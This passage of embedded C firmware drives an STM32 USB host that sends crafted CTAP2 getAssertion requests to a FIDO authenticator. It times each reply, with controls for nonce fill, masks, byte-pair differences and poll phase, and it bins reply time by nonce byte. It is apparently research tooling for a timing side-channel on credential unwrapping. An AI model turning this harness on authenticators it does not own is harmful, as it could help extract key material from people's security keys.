            g_req[o++] = (uint8_t)(0x40u | g_idlen);      /* bytes(<24), 1-byte head */
        }
        else {
            g_req[o++] = 0x58; g_req[o++] = (uint8_t)g_idlen;
        }
        uint32_t idstart = o;
        for (uint32_t i = 0; i < g_idlen; i++) g_req[o++] = prng_byte();
        if (g_fixid_on) {
            for (uint32_t i = 0; i < g_idlen && i < sizeof g_fixid; i++)
                g_req[idstart + i] = g_fixid[i];
        }
        if (g_nfill <= 0xFFu) {
            for (uint32_t i = 152u; i < 164u && i < g_idlen; i++)
                if (g_nmask & (1u << (i - 152u)))
                    g_req[idstart + i] = (uint8_t)(g_nfill ^ g_noff[i - 152u]);
        }
        if (g_fixnonce_on && g_idlen >= 164u) {
            for (uint32_t i = 0; i < 12u; i++)
                g_req[idstart + 152u + i] = g_fixnonce[i];
        }
        if (g_pair_on && g_idlen >= 164u) {
            uint8_t r = prng_byte();
            g_req[idstart + 152u + g_pair_p] = r;
            g_req[idstart + 152u + g_pair_q] = (uint8_t)(r ^ g_pair_d);
        }
        g_req[o++] = 0x64; g_req[o++]='t'; g_req[o++]='y'; g_req[o++]='p'; g_req[o++]='e';
        g_req[o++] = 0x6A; g_req[o++]='p'; g_req[o++]='u'; g_req[o++]='b'; g_req[o++]='l';
        g_req[o++]='i'; g_req[o++]='c'; g_req[o++]='-'; g_req[o++]='k'; g_req[o++]='e';
        g_req[o++]='y';
    }
    g_req[o++] = 0x05;
    g_req[o++] = 0xA1;                                   /* map(1) options */
    g_req[o++] = 0x62; g_req[o++]='u'; g_req[o++]='p';
    g_req[o++] = 0xF4;                                   /* false */
    g_req_len = o;
}

/* Receive one message with the poll loop that demonstrably works (the `W`
 * trace's), rather than the layered one.  Polls IN directly, accepts a report the
 * moment bytes arrive whatever the return code says, and reads continuations the
 * same way.  Returns the CTAPHID cmd in *cmd and the payload in buf.
 *
 * ctaphid_recv() is kept for INIT, where it is proven, and deliberately NOT used
 * on the timed path: it failed here at a fixed 25 ms while this loop, on the same
 * wire and the same device, gets the reply. */
static int recv_message(uint8_t *cmd, uint8_t *buf, uint32_t cap, uint32_t *len_out,
                        uint32_t polls, uint32_t *naks, uint32_t *keepalives)
{
    uint8_t rep[HID_MPS];
    uint32_t ka = 0, n = 0;
    g_fast_halt = 1u;
    /* A FIXED pre-poll delay, which is the knob that makes the threshold usable.
     *
     * Measured poll starts, 8-entry request, halt guard 8/2/1 alike:
     *   4, 429, 438, 446, 835, 844, 852, 1241, 1250, 1258 us
     * i.e. three polls ~8 us apart, then a 389 us gap, period ~406 us -- and the gap
     * is NOT our halt loop, since shortening the guard to 1 iteration does not move
     * it. So the reply lands on a ~406 us comb, one extra colliding lookup is worth
     * ~50 us, and the fast/slow outcome is flat until several collisions accumulate:
     * the dose curve reads 0/110 at one collision through 0/106 at five, then
     * 11/114 at eight.
     *
     * Delaying the first poll by a fixed s slides the whole comb against the
     * device's completion instant, so the decision boundary can be PLACED inside
     * the ~50 us that one collision is worth. That is what turns a threshold into a
     * comparator, and it is available only because we are the host. */
    if (g_prepoll_us) delay_us(g_prepoll_us);
    if (g_dither_us) delay_us(dither_next());
    uint32_t tref = now();
    g_pn = 0;
    for (uint32_t k = 0; k < polls; k++) {
        for (uint32_t i = 0; i < HID_MPS; i++) rep[i] = 0xA5u;
        uint32_t got = 0;
        if (g_pn < 10u) g_pt[g_pn++] = now() - tref;
        hc_prep_bulk(0, g_ep_in, 1);
        int q = hc_txn(0, 1, g_tog_in ? PID_DATA1 : PID_DATA0, rep, HID_MPS, &got, g_poll_us);
        if (!got) {
            if (q == XR_ERR && (g_hcint_last & USB_OTG_HCINT_DTERR)) g_tog_in ^= 1u;
            n++;
            continue;
        }
        g_tog_in ^= 1u;
        for (uint32_t i = 0; i < HID_MPS; i++) g_raw[i] = rep[i];
        if (!(rep[4] & 0x80u)) continue;                  /* stray continuation */
        if (rep[4] == 0xBBu) { ka++; continue; }          /* KEEPALIVE */
        uint32_t blen = ((uint32_t)rep[5] << 8) | rep[6];
        if (blen > cap) blen = cap;
        if (cmd) *cmd = rep[4];
        uint32_t take = blen < (HID_MPS - 7u) ? blen : (HID_MPS - 7u), out = 0;
        for (uint32_t i = 0; i < take; i++) buf[out++] = rep[7 + i];
        while (out < blen) {
            uint32_t got2 = 0;
            for (uint32_t i = 0; i < HID_MPS; i++) rep[i] = 0xA5u;
            hc_prep_bulk(0, g_ep_in, 1);
            int q2 = hc_txn(0, 1, g_tog_in ? PID_DATA1 : PID_DATA0, rep, HID_MPS, &got2, g_poll_us);
            if (!got2) {
                if (q2 == XR_ERR && (g_hcint_last & USB_OTG_HCINT_DTERR)) g_tog_in ^= 1u;
                if (++n > polls + 40u) return XR_TIMEOUT;
                continue;
            }
            g_tog_in ^= 1u;
            uint32_t chunk = blen - out;
            if (chunk > HID_MPS - 5u) chunk = HID_MPS - 5u;
            for (uint32_t i = 0; i < chunk; i++) buf[out++] = rep[5 + i];
        }
        if (len_out) *len_out = out;
        if (naks) *naks = n;
        if (keepalives) *keepalives = ka;
        return XR_OK;
    }
    if (naks) *naks = n;
    return XR_TIMEOUT;
}

/* One timed probe.  The clock starts when the last OUT report has been ACKed and
 * stops on the first non-NAK IN, so it spans exactly the interval the
 * authenticator spends deciding -- including ~20 AES-CCM unwraps per allow-list
 * entry.  FTREM is the frame time remaining when the clock started: the sboot
 * campaign found a frame-phase artifact, so it is recorded per trace rather than
 * hoped away. */
static int probe_once(uint32_t entries, uint32_t seed, uint32_t *ticks,
                      uint32_t *naks, uint8_t *status, uint32_t *ftrem)
{
    build_get_assertion(entries, seed);
    /* The phase gate goes HERE -- after the request is assembled and immediately before the
     * first packet leaves -- and not in the batch loop, which is where it was first put.
     * Gating before the build means everything between the gate and the send drifts the
     * phase, and the drift grows with the request: at 4 entries the recorded `ftrem` sat in a
     * ~10-clock band, and at 8 entries (~1430 bytes, with frequent recovery in between) the
     * arms smeared across the whole frame, which made a phase experiment on long requests
     * measure nothing. Gate last, then read the phase, then send. */
    await_phase();
    /* Set the status BEFORE anything can fail.  Every `return r` below leaves
     * `*status` untouched, and the callers declare `uint8_t st = 0` -- so a
     * transfer that never got a reply reported st=0x00, which is indistinguishable
     * from a CTAP SUCCESS.  That is exactly how it was read: the Dongle's faults
     * were reported as 6 % "the device is signing assertions", when 0x00 meant the
     * opposite -- no reply at all.  0xFE says "no status was read"; 0xFF below
     * still means "a reply arrived carrying no bytes", which is a different thing.
     * Both are outside the CTAP status range, so the `st != 0x2E` fault tests are
     * unaffected. */
    *status = 0xFEu;
    *ftrem = (OTGH->HFNUM >> 16) & 0xFFFFu;
    g_last_cmd = 0; g_last_len = 0; g_last_ka = 0;
    int r = ctaphid_send(g_cid, 0x90u, g_req, g_req_len);   /* CTAPHID_CBOR */
    g_last_send = r;
    if (r != XR_OK) return r;
    uint32_t t0 = now();
    uint8_t cmd = 0; uint32_t len = 0, ka = 0;
    r = recv_message(&cmd, g_rep, sizeof g_rep, &len, 3000u, naks, &ka);
    *ticks = now() - t0;
    g_last_recv = r; g_last_cmd = cmd; g_last_len = len; g_last_ka = ka;
    if (r != XR_OK) return r;
    *status = len ? g_rep[0] : 0xFFu;
    return (cmd == 0x90u) ? XR_OK : XR_ERR;
}

int main(void) {
    uart_init(16000000u);
    nl(); uputs("ctaphost boot (HSI)"); nl();
    clock_init();
    uart_init(36000000u);
    uputs("ctaphost stageB  SYSCLK=");
    putdec((RCC->CFGR & RCC_CFGR_SWS) == RCC_CFGR_SWS_PLL ? 72000000u : 16000000u);
    nl();
    tim2_init(); otg_gpio(); vbus_gpio_init();

    int rc = otg_host_init();
    if (rc) { uputs("  OTG init FAILED step "); putdec((uint32_t)rc); nl(); }
    else    { uputs("  OTG host mode, port powered"); nl(); }
    report_port(); report_vbus();

    char line[64];
    uputs("  cmds: V | P <0|1> vbus | O port | R reset | E enum | C cfg"
          " | I ctaphid-init | G <entries> | T <seed> <entries> <count>"
          " | Y <2|3> eptyp | X raw out+in | Z [n] IN trace"
          " | K <len> ping | B <n> dump req | F <us> poll timeout"
          " | D <dither_us> <haltguard> | g <us> gap | f <lo> <hi> frame phase"); nl();
    for (;;) {
        getline_(line, sizeof line);
        const char *p = line + 1;
        switch (line[0]) {
        case 'V':
            uputs("ctaphost stageB addr="); putdec(g_addr);
            uputs(" mps="); putdec(g_mps);
            uputs(" epout=0x"); puthexb(g_ep_out);
            uputs(" epin=0x"); puthexb((uint8_t)(0x80u | g_ep_in));
            uputs(" cid=0x"); puthex32(g_cid);
            uputs(" tick=13.9ns"); nl();
            report_port(); report_vbus();
            break;
        case 'P':
            while (*p == ' ') p++;
            if (*p != '1') {
                /* CUTTING POWER INVALIDATES EVERY CACHED USB FACT.
                 *
                 * `ensure_ready()` returns early on `g_ep_out && g_ep_in`, so without
                 * this the host keeps believing endpoints it read from a device that has
                 * since been power-cycled, never re-enumerates, and every CTAPHID INIT
                 * times out -- while `P 1` cheerfully reports PG6=1. Measured on
                 * 2026-09-28 during the first VBUS soak: ten cycles "recovered" and all
                 * ten were timeouts.
                 *
                 * This matters for the nRF52840 Dongle specifically, because VBUS is the
                 * ONLY reset it has. On the DK the harness reopens the host and re-runs
                 * bring-up, which re-enumerates as a side effect and hid the problem. */
                g_ep_out = 0; g_ep_in = 0; g_cid = 0; g_addr = 0;
                g_tog_out = g_tog_in = 0;
            }
            vbus_set(*p == '1');
            delay_us(200000);
            report_vbus(); report_port();
            break;
        case 'Y': {     /* Y <2|3> : channel type for the HID endpoints */
            while (*p == ' ') p++;
            if (*p == '3') g_eptyp = 3u; else g_eptyp = 2u;
            uputs("  eptyp="); putdec(g_eptyp);
            uputs(g_eptyp == 2u ? " (bulk/non-periodic)" : " (interrupt/periodic)"); nl();
            break; }
        case 'X': {     /* X : one raw OUT then one raw IN, with the channel state
                         * dumped around each.  Decides host-vs-device: if the
                         * channel never starts, HCTSIZ still holds our PKTCNT and
                         * HCINT is empty. */
            uint8_t rep[HID_MPS];
            for (uint32_t i = 0; i < HID_MPS; i++) rep[i] = 0;
            rep[0]=0xFF; rep[1]=0xFF; rep[2]=0xFF; rep[3]=0xFF;
            rep[4]=0x86; rep[5]=0; rep[6]=8;
            rep[7]=0xde; rep[8]=0xad; rep[9]=0xbe; rep[10]=0xef;
            hc_prep_bulk(0, g_ep_out, 0);
            uputs("  ep: out="); putdec(g_ep_out); uputs(" in="); putdec(g_ep_in); nl();
            uputs("  OUT pre  HCCHAR="); puthex32(HC(0)->HCCHAR);
            uputs(" epnum="); putdec((HC(0)->HCCHAR >> 11) & 0xFu);
            uputs(" HNPTXSTS="); puthex32(OTG->HNPTXSTS); nl();
            int r = hc_txn(0, 0, g_tog_out ? PID_DATA1 : PID_DATA0, rep, HID_MPS, 0, 20000);
            uputs("  OUT -> "); uputs(xr_name(r));
            uputs("  HCINT@decide="); puthex32(g_hcint_last); put_hcint(g_hcint_last);
            uputs(" HCINT=");  puthex32(HC(0)->HCINT);
            uputs(" HCTSIZ="); puthex32(HC(0)->HCTSIZ);
            uputs(" HCCHAR="); puthex32(HC(0)->HCCHAR);
            uputs(" GINTSTS="); puthex32(OTG->GINTSTS); nl();
            if (r == XR_OK) g_tog_out ^= 1u;
            uint32_t got = 0;
            hc_prep_bulk(0, g_ep_in, 1);
            r = hc_txn(0, 1, g_tog_in ? PID_DATA1 : PID_DATA0, rep, HID_MPS, &got, 20000);
            uputs("  IN  -> "); uputs(xr_name(r)); uputs(" got="); putdec(got);
            uputs(" HCINT@decide="); puthex32(g_hcint_last); put_hcint(g_hcint_last);
            uputs(" HCINT="); puthex32(HC(0)->HCINT);
            uputs(" HCTSIZ="); puthex32(HC(0)->HCTSIZ);
            uputs(" GRXSTSR="); puthex32(OTG->GRXSTSR); nl();
            if (r == XR_OK && got) {
                g_tog_in ^= 1u;
                uputs("  data: ");
                for (uint32_t i = 0; i < got && i < 20u; i++) puthexb(rep[i]);
                nl();
            }
            break; }
        case 'Z': {     /* Z [n] : one CTAPHID INIT report out, then n raw IN
                         * attempts printed one per line.  This is the trace that
                         * says whether the device NAKs (busy), answers, or never
                         * responds at all -- three very different bugs. */
            uint32_t n = 0; while (*p == ' ') p++;
            while (*p >= '0' && *p <= '9') { n = n*10 + (uint32_t)(*p - '0'); p++; }
            if (!n || n > 40u) n = 12u;
            if (ensure_ready() != XR_OK) { uputs("  not ready"); nl(); break; }
            uint8_t rep[HID_MPS];
            for (uint32_t i = 0; i < HID_MPS; i++) rep[i] = 0;
            rep[0]=0xFF; rep[1]=0xFF; rep[2]=0xFF; rep[3]=0xFF;
            rep[4]=0x86; rep[5]=0; rep[6]=8;
            rep[7]=0x11; rep[8]=0x22; rep[9]=0x33; rep[10]=0x44;
            rep[11]=0x55; rep[12]=0x66; rep[13]=0x77; rep[14]=0x88;
            /* Send the report THREE times, alternating the toggle as a bulk OUT
             * must.  Hypothesis under test: the first report is ACKed into the
             * nRF's endpoint buffer before RIOT has armed a read, so the stack
             * never sees it -- in which case a later one lands.  A device that
             * answers only the second or third report is a very different thing
             * from one that answers none. */
            g_tog_out = g_tog_in = 0;
            int r = XR_ERR;
            for (uint32_t a = 0; a < 3u; a++) {
                hc_prep_bulk(0, g_ep_out, 0);
                r = hc_txn(0, 0, (a & 1u) ? PID_DATA1 : PID_DATA0, rep, HID_MPS, 0, 20000);
                uputs("  OUT["); putdec(a); uputs("] -> "); uputs(xr_name(r));
                uputs(" HCINT="); put_hcint(g_hcint_last); nl();
                if (r != XR_OK) break;
                delay_us(5000);
            }
            if (r != XR_OK) break;
            /* Give RIOT's CTAPHID thread time to see the report before the first
             * poll.  If the reply still never comes, the report is not being
             * processed -- which is a different bug from a toggle mismatch. */
            delay_us(30000);
            /* Let the CORE own the toggle: it writes its expectation back into
             * HCTSIZ.DPID after every transfer, and fighting it with a private
             * counter is what produced the DTERR / CHH / ZLP cycle. */
            uint32_t dpid = PID_DATA0;
            for (uint32_t k = 0; k < n; k++) {
                for (uint32_t i = 0; i < HID_MPS; i++) rep[i] = 0xA5u;
                uint32_t got = 0;
                hc_prep_bulk(0, g_ep_in, 1);
                int q = hc_txn(0, 1, dpid, rep, HID_MPS, &got, 20000);
                uint32_t core_dpid = (HC(0)->HCTSIZ >> 29) & 3u;
                uputs("  IN["); putdec(k); uputs("] pid="); putdec(dpid);
                uputs(" coredpid="); putdec(core_dpid);
                uputs(" -> "); uputs(xr_name(q));
                uputs(" got="); putdec(got);
                uputs(" HCINT="); put_hcint(g_hcint_last);
                if (q == XR_OK && got) {
                    uputs("  data=");
                    for (uint32_t i = 0; i < 16u; i++) puthexb(rep[i]);
                }
                nl();
                if (q == XR_OK && got) break;
                if (q == XR_ERR && (g_hcint_last & USB_OTG_HCINT_DTERR))
                    dpid = (dpid == PID_DATA0) ? PID_DATA1 : PID_DATA0;
                else
                    dpid = core_dpid;
                delay_us(5000);
            }
            break; }
        case 'W': {     /* W <entries> [polls] : send a getAssertion, then poll the
                         * IN endpoint verbosely.  Same instrument as Z, pointed at
                         * the request that matters. */
            uint32_t n = 0, polls = 0; while (*p == ' ') p++;
            while (*p >= '0' && *p <= '9') { n = n*10 + (uint32_t)(*p - '0'); p++; }
            while (*p == ' ') p++;
            while (*p >= '0' && *p <= '9') { polls = polls*10 + (uint32_t)(*p - '0'); p++; }
            if (!n || n > 20u) n = 1u;
            if (!polls || polls > 60u) polls = 20u;
            if (ensure_ready() != XR_OK) { uputs("  not ready"); nl(); break; }
            if (!g_cid && ctaphid_init() != XR_OK) { uputs("  no cid"); nl(); break; }
            build_get_assertion(n, 0x1234u);
            uint32_t tsend = now();
            int r = ctaphid_send(g_cid, 0x90u, g_req, g_req_len);
            uputs("  send("); putdec(g_req_len); uputs("B) -> "); uputs(xr_name(r));
            uputs(" us="); putdec((now() - tsend) / 72u);
            uputs(" togout="); putdec(g_tog_out);
            uputs(" togin="); putdec(g_tog_in); nl();
            if (r != XR_OK) break;
            uint8_t rep[HID_MPS];
            uint32_t t0 = now();
            for (uint32_t k = 0; k < polls; k++) {
                for (uint32_t i = 0; i < HID_MPS; i++) rep[i] = 0xA5u;
                uint32_t got = 0;
                hc_prep_bulk(0, g_ep_in, 1);
                int q = hc_txn(0, 1, g_tog_in ? PID_DATA1 : PID_DATA0,
                               rep, HID_MPS, &got, 20000);
                uputs("  IN["); putdec(k); uputs("] t="); putdec((now() - t0) / 72u);
                uputs("us pid="); putdec(g_tog_in ? 2u : 0u);
                uputs(" -> "); uputs(xr_name(q)); uputs(" got="); putdec(got);
                uputs(" "); put_hcint(g_hcint_last);
                if (got) {
                    g_tog_in ^= 1u;
                    uputs("  data=");
                    for (uint32_t i = 0; i < 24u; i++) puthexb(rep[i]);
                    nl();
                    break;
                }
                if (q == XR_ERR && (g_hcint_last & USB_OTG_HCINT_DTERR)) {
                    g_tog_in ^= 1u; uputs("  (toggle flipped)");
                }
                nl();
                delay_us(1000);
            }
            break; }
        case 'B': {     /* B <entries> : dump the request bytes, so the host can
                         * decode what the firmware actually built rather than
                         * what its author meant. */
            uint32_t n = 0; while (*p == ' ') p++;
            while (*p >= '0' && *p <= '9') { n = n*10 + (uint32_t)(*p - '0'); p++; }
            if (!n || n > 20u) n = 1u;
            build_get_assertion(n, 0x1234u);
            uputs("  req "); putdec(g_req_len); uputs(" bytes:"); nl();
            for (uint32_t i = 0; i < g_req_len; i++) {
                puthexb(g_req[i]);
                if ((i & 31u) == 31u) nl();
            }
            nl(); uputs("END"); nl();
            break; }
        case 'K': {     /* K <len> : CTAPHID_PING of <len> bytes.  RIOT echoes the
                         * payload verbatim, so this tests multi-packet assembly
                         * with no CBOR in the way: send a known pattern, compare
                         * what comes back, and report the first byte that differs.
                         * A transport bug and a parser bug look the same from the
                         * CBOR side; this tells them apart. */
            uint32_t len = 0; while (*p == ' ') p++;
            while (*p >= '0' && *p <= '9') { len = len*10 + (uint32_t)(*p - '0'); p++; }
            if (!len || len > 1000u) len = 200u;
            if (ensure_ready() != XR_OK) { uputs("  not ready"); nl(); break; }
            if (!g_cid && ctaphid_init() != XR_OK) { uputs("  no cid"); nl(); break; }
            for (uint32_t i = 0; i < len; i++) g_req[i] = (uint8_t)(i & 0xFFu);
            g_out_retries = g_out_retry_max = g_out_amb = 0;
            int r = ctaphid_send(g_cid, 0x81u, g_req, len);
            uputs("  PING("); putdec(len); uputs(") send -> "); uputs(xr_name(r));
            uputs(" retries="); putdec(g_out_retries);
            uputs(" max/pkt="); putdec(g_out_retry_max);
            uputs(" ambiguous="); putdec(g_out_amb); nl();
            if (r != XR_OK) break;
            uint8_t cmd2 = 0; uint32_t got = 0, naks = 0, ka = 0;
            r = recv_message(&cmd2, g_rep, sizeof g_rep, &got, 400u, &naks, &ka);
            uputs("  echo -> "); uputs(xr_name(r));
            uputs(" cmd=0x"); puthexb(cmd2);
            uputs(" len="); putdec(got);
            uputs(" naks="); putdec(naks); nl();
            if (r == XR_OK) {
                uint32_t bad = 0xFFFFFFFFu;
                for (uint32_t i = 0; i < got && i < len; i++)
                    if (g_rep[i] != g_req[i]) { bad = i; break; }
                if (got != len) { uputs("  LENGTH MISMATCH: sent "); putdec(len);
                                  uputs(" got "); putdec(got); nl(); }
                if (bad == 0xFFFFFFFFu) { uputs("  payload identical"); nl(); }
                else {
                    uputs("  first difference at byte "); putdec(bad);
                    uputs(": sent 0x"); puthexb(g_req[bad]);
                    uputs(" got 0x"); puthexb(g_rep[bad]); nl();
                    uputs("  around: sent ");
                    for (uint32_t i = (bad > 4u ? bad - 4u : 0u); i < bad + 6u && i < len; i++) puthexb(g_req[i]);
                    uputs(" got ");
                    for (uint32_t i = (bad > 4u ? bad - 4u : 0u); i < bad + 6u && i < got; i++) puthexb(g_rep[i]);
                    nl();
                }
            }
            break; }
        case 'D': {     /* D <us> <in-guard> <out-guard> : dither span and halt guards */
            uint32_t v = 0, gg = 0, go = 0; while (*p == ' ') p++;
            while (*p >= '0' && *p <= '9') { v = v*10 + (uint32_t)(*p - '0'); p++; }
            while (*p == ' ') p++;
            while (*p >= '0' && *p <= '9') { gg = gg*10 + (uint32_t)(*p - '0'); p++; }
            while (*p == ' ') p++;
            while (*p >= '0' && *p <= '9') { go = go*10 + (uint32_t)(*p - '0'); p++; }
            g_dither_us = v;
            if (gg) g_halt_guard = gg;
            if (go) g_halt_guard_out = go;
            uputs("  dither="); putdec(g_dither_us);
            uputs(" us  haltguard in="); putdec(g_halt_guard);
            uputs(" out="); putdec(g_halt_guard_out); nl();
            break; }
        case 'H': {     /* H <off> <hex...> : load credential-id bytes; H alone clears */
            uint32_t off = 0; int any = 0; while (*p == ' ') p++;
            while (*p >= '0' && *p <= '9') { off = off*10 + (uint32_t)(*p - '0'); p++; any = 1; }
            if (!any) { g_fixid_on = 0u; uputs("  fixid off"); nl(); break; }
            while (*p == ' ') p++;
            uint32_t n = 0;
            for (;;) {
                int hi = hexval(*p), lo = hexval(*(p + 1));
                if (hi < 0 || lo < 0) break;
                if (off + n < sizeof g_fixid)
                    g_fixid[off + n] = (uint8_t)((hi << 4) | lo);
                n++; p += 2;
            }
            g_fixid_on = 1u;
            uputs("  fixid["); putdec(off); uputs("..") ; putdec(off + n - 1u);
            uputs("] loaded"); nl();
            break; }
        case 'S': {     /* S <us> : fixed delay before the first IN poll */
            uint32_t v = 0; int any = 0; while (*p == ' ') p++;
            while (*p >= '0' && *p <= '9') { v = v*10 + (uint32_t)(*p - '0'); p++; any = 1; }
            if (any) g_prepoll_us = v;
            uputs("  prepoll="); putdec(g_prepoll_us); uputs(" us"); nl();
            break; }
        case 'M': {     /* M <mask> : 12-bit mask of which nonce bytes the fill covers */
            uint32_t v = 0; int any = 0; while (*p == ' ') p++;
            while (*p >= '0' && *p <= '9') { v = v*10 + (uint32_t)(*p - '0'); p++; any = 1; }
            if (any) g_nmask = v & 0xFFFu;
            uputs("  nmask=");
            for (int b = 11; b >= 0; b--) uputc((g_nmask & (1u << b)) ? '1' : '0');
            nl();
            break; }
        case 'U': {     /* U <i> <val> : fill offset for nonce byte i; i > 11 clears all */
            uint32_t i = 0, v = 0; int any = 0; while (*p == ' ') p++;
            while (*p >= '0' && *p <= '9') { i = i*10 + (uint32_t)(*p - '0'); p++; any = 1; }
            while (*p == ' ') p++;
            while (*p >= '0' && *p <= '9') { v = v*10 + (uint32_t)(*p - '0'); p++; }
            if (any && i < 12u) g_noff[i] = (uint8_t)v;
            else if (any) for (uint32_t j = 0; j < 12u; j++) g_noff[j] = 0u;
            uputs("  noff=");
            for (uint32_t j = 0; j < 12u; j++) puthexb(g_noff[j]);
            nl();
            break; }
        case 'L': {     /* L <p> <q> <delta> : pair-difference mode; p == q turns it off */
            uint32_t a = 0, b = 0, d = 0; int any = 0; while (*p == ' ') p++;
            while (*p >= '0' && *p <= '9') { a = a*10 + (uint32_t)(*p - '0'); p++; any = 1; }
            while (*p == ' ') p++;
            while (*p >= '0' && *p <= '9') { b = b*10 + (uint32_t)(*p - '0'); p++; }
            while (*p == ' ') p++;
            while (*p >= '0' && *p <= '9') { d = d*10 + (uint32_t)(*p - '0'); p++; }
            if (any) {
                if (a == b || a > 11u || b > 11u) { g_pair_on = 0u; }
                else { g_pair_on = 1u; g_pair_p = a; g_pair_q = b; g_pair_d = d & 0xFFu; }
            }
            uputs("  pair=");
            if (g_pair_on) { putdec(g_pair_p); uputc(','); putdec(g_pair_q);
                             uputs(" d="); putdec(g_pair_d); }
            else uputs("off");
            nl();
            break; }
        case 'A': {     /* A <0|1> : fault recovery inside T -- escalating, or none */
            uint32_t v = 0; int any = 0; while (*p == ' ') p++;
            while (*p >= '0' && *p <= '9') { v = v*10 + (uint32_t)(*p - '0'); p++; any = 1; }
            if (any) g_recover_mode = v;
            uputs("  recover="); putdec(g_recover_mode); nl();
            break; }
        case 'J': {     /* J <us> : per-poll jitter span, 0 turns it off */
            uint32_t v = 0; int any = 0; while (*p == ' ') p++;
            while (*p >= '0' && *p <= '9') { v = v*10 + (uint32_t)(*p - '0'); p++; any = 1; }
            if (any) g_poll_jitter = v;
            uputs("  jitter="); putdec(g_poll_jitter); uputs(" us"); nl();
            break; }
        case 'N': {     /* N <v> : nonce fill value, >255 turns the fill off */
            uint32_t v = 0; int any = 0; while (*p == ' ') p++;
            while (*p >= '0' && *p <= '9') { v = v*10 + (uint32_t)(*p - '0'); p++; any = 1; }
            if (any) g_nfill = v;
            uputs("  nfill=");
            if (g_nfill <= 0xFFu) putdec(g_nfill); else uputs("off");
            nl();
            break; }
        case 'F': {     /* F <us> : per-poll timeout */
            uint32_t v = 0; while (*p == ' ') p++;
            while (*p >= '0' && *p <= '9') { v = v*10 + (uint32_t)(*p - '0'); p++; }
            if (v) g_poll_us = v;
            uputs("  poll timeout="); putdec(g_poll_us); uputs(" us"); nl();
            break; }
        case 'O': report_port(); break;
        case 'R': port_reset(); report_port(); break;
        case 'E':
            /* enumerate AND read the endpoints: they are not optional extras,
             * they are what the HID transactions address. */
            if (enumerate() == XR_OK) read_config_desc();
            g_tog_out = g_tog_in = 0;
            break;
        case 'C': read_config_desc(); break;
        case 'I':
            if (ensure_ready() != XR_OK) { uputs("  not ready"); nl(); break; }
            uputs("  CTAPHID INIT -> "); uputs(xr_name(ctaphid_init()));
            uputs(" cid=0x"); puthex32(g_cid); nl();
            break;
        case 'G': {     /* G <entries> : one timed getAssertion, verbose */
            uint32_t n = 0; int have = 0; while (*p == ' ') p++;
            while (*p >= '0' && *p <= '9') { n = n*10 + (uint32_t)(*p - '0'); p++; have = 1; }
            if (!have || n > 20u) n = 1u;                /* `G 0` = no allowList */
            while (*p == ' ') p++;
            uint32_t il = 0;
            while (*p >= '0' && *p <= '9') { il = il*10 + (uint32_t)(*p - '0'); p++; }
            if (il && il <= 200u) g_idlen = il;
            while (*p == ' ') p++;
            uint32_t sd = 0;                       /* decimal: this rig's base has
                                                    * no hex parser, and a seed does
                                                    * not need one */
            while (*p >= '0' && *p <= '9') { sd = sd*10u + (uint32_t)(*p++ - '0'); }
            /* `G <entries> <idlen> <seed>`: an explicit seed makes the probe input
             * reproducible AND variable.  Repeating G with one seed replays a
             * byte-identical request, which is the fixed-input control; stepping
             * the seed varies every blob byte.  Comparing the two spreads is the
             * whole experiment -- it is arm A's sd-0.000-versus-sd-34.8
             * decomposition, done from the bus. */
            uint32_t probe_seed = sd ? sd : 0x1234u;
            if (ensure_ready() != XR_OK) { uputs("  not ready"); nl(); break; }
            if (!g_cid && ctaphid_init() != XR_OK) { uputs("  no cid"); nl(); break; }
            uint32_t t = 0, naks = 0, ft = 0; uint8_t st = 0;
            int r = probe_once(n, probe_seed, &t, &naks, &st, &ft);
            if (r != XR_OK || st != 0x2Eu) {
                /* Back to a fresh channel.  The spec-correct abort (INIT on our
                 * own cid) is implemented in ctaphid_abort() and is NOT used here:
                 * measured, it made things worse -- 1 of 16 probes succeeded
                 * against 8 of 20 with a plain re-INIT -- most likely because the
                 * abort's own receive can return OK on a stray report, so we keep
                 * using a channel the device has given up on. Kept for the next
                 * attempt, wired out of the path. */
                g_cid = 0; ctaphid_init();
            }
            uputs("  entries="); putdec(n);
            uputs(" idlen="); putdec(g_idlen);
            uputs(" reqlen="); putdec(g_req_len);
            uputs(" -> "); uputs(xr_name(r));
            uputs(" status=0x"); puthexb(st);
            uputs(" ticks="); putdec(t);
            uputs(" us="); putdec(t / 72u);
            uputs(" naks="); putdec(naks);
            uputs(" ftrem="); putdec(ft); nl();
            uputs("  send="); uputs(xr_name(g_last_send));
            uputs(" recv="); uputs(xr_name(g_last_recv));
            uputs(" cmd=0x"); puthexb(g_last_cmd);
            uputs(" len="); putdec(g_last_len);
            uputs(" keepalive="); putdec(g_last_ka); nl();
            uputs("  raw: ");
            for (uint32_t i = 0; i < 24u; i++) puthexb(g_raw[i]);
            nl();
            uputs("  poll starts (us): ");
            for (uint32_t i = 0; i < g_pn; i++) { putdec(g_pt[i] / 72u); uputc(' '); }
            nl();
            break; }
        case 'Q': {     /* Q <seed hex> <entries> <count> : profiling batch.  One
                         * nonce per probe, shared by every credential id in the
                         * request and REPORTED, so the host can bin the reply time by
                         * any nonce byte.  Record is
                         * "<ticks> <polls> <noncehex>", then END. */
            uint32_t seed = 0, n = 0, count = 0; int d;
            while (*p == ' ') p++;
            while ((d = (*p >= '0' && *p <= '9') ? *p - '0' :
                        (*p >= 'a' && *p <= 'f') ? *p - 'a' + 10 :
                        (*p >= 'A' && *p <= 'F') ? *p - 'A' + 10 : -1) >= 0)
                { seed = (seed << 4) | (uint32_t)d; p++; }
            while (*p == ' ') p++;
            while (*p >= '0' && *p <= '9') { n = n*10 + (uint32_t)(*p - '0'); p++; }
            while (*p == ' ') p++;
            while (*p >= '0' && *p <= '9') { count = count*10 + (uint32_t)(*p - '0'); p++; }
            if (!n || n > 20u) n = 8u;
            if (!count) count = 100u;
            if (ensure_ready() != XR_OK) { uputs("  not ready"); nl(); break; }
            if (!g_cid && ctaphid_init() != XR_OK) { uputs("  no cid"); nl(); break; }
            prng = seed ? seed : 1u;
            g_fixnonce_on = 1u;
            uint32_t qstreak = 0;
            for (uint32_t k = 0; k < count; k++) {
                /* The nonce for THIS probe, drawn before the request is built so it
                 * is identical in all `n` entries.  Drawn from the same stream the
                 * request bytes come from, which is why it is reported rather than
                 * recomputed on the host. */
                for (uint32_t i = 0; i < 12u; i++) g_fixnonce[i] = prng_byte();
                uint32_t t = 0, naks = 0, ft = 0; uint8_t st = 0;
                int r = probe_once(n, prng, &t, &naks, &st, &ft);
                if (r != XR_OK || st != 0x2Eu) {
                    uputs("# err "); putdec((uint32_t)r); uputs(" st=0x"); puthexb(st);
                    uputs(" at "); putdec(k); uputs(" ftrem="); putdec(ft); nl();
                    if (g_recover_mode == 1u) continue;
